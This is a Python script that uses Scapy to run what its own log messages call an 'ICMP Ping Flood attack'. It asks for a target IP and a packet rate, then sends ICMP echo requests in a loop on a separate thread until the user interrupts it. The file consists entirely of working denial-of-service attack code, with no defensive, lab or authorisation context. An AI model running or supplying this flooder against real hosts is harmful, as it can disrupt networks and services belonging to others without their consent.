import logging  # Import the logging library for better control over log messages
import scapy.all as scapy  # Import all functions from Scapy for packet manipulation
import time  # Import the time library for rate-limiting
from threading import Thread  # Import Thread class for multi-threading

# Configure logging settings
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def send_icmp_ping(target_ip, rate_limit):
    """
    Send ICMP echo requests (ping) to the target IP address at a specified rate.
    :param target_ip: The IP address of the target machine.
    :param rate_limit: The number of packets to send per second.
    """
    packet = scapy.IP(dst=target_ip) / scapy.ICMP()  # Construct an ICMP packet with the target IP address
    interval = 1.0 / rate_limit  # Calculate the interval between packets based on the rate limit
    logging.info(f"Starting ICMP Ping Flood attack on {target_ip} with a rate limit of {rate_limit} pings/second")

    while True:
        try:
            scapy.send(packet, verbose=False)  # Send the ICMP packet without verbose output
            time.sleep(interval)  # Wait for the specified interval before sending the next packet
        except KeyboardInterrupt:
            logging.info("Attack stopped by user")
            break

def start_attack():
    """
    Prompt the user for target IP and rate limit, then start the ICMP ping flood attack.
    """
    target_ip = input("Enter the target IP address: ")  # Prompt the user to input the target IP address
    rate_limit = int(input("Enter the rate limit (packets per second): "))  # Prompt the user to input the rate limit

    attack_thread = Thread(target=send_icmp_ping, args=(target_ip, rate_limit))  # Create a new thread for the attack
    attack_thread.start()  # Start the attack thread

if __name__ == "__main__":
    start_attack()  # Start the attack when the script is executed
